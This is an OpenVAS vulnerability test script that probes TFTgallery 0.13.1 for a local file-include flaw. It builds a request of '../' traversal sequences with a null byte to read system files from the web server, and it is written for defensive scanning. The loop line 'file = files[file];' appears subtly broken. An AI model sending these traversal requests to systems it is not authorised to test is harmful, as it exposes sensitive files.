###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tftgallery_44523.nasl 12315 2018-11-12 09:24:01Z cfischer $
#
# TFTgallery 'thumbnailformpost.inc.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tftgallery:tftgallery";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100879");
  script_version("$Revision: 12315 $");
  script_bugtraq_id(44523);
  script_tag(name:"last_modification", value:"$Date: 2018-11-12 10:24:01 +0100 (Mon, 12 Nov 2018) $");
  script_tag(name:"creation_date", value:"2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_name("TFTgallery 'thumbnailformpost.inc.php' Local File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("tftgallery_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("tftgallery/detected");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44523");
  script_xref(name:"URL", value:"http://tftgallery.sourceforge.net/");
  script_xref(name:"URL", value:"http://www.tftgallery.org/versions/tftgallery-0.13-to-0.13.1.zip");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible.");

  script_tag(name:"affected", value:"TFTgallery 0.13.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Updates are available to address this issue. Please see the references
  for more information.");

  script_tag(name:"summary", value:"TFTgallery is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[file];
  url = dir + "/admin/thumbnailformpost.inc.php?adminlangfile=" + crap( data:"../", length:3*9 ) + file + "%00";

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );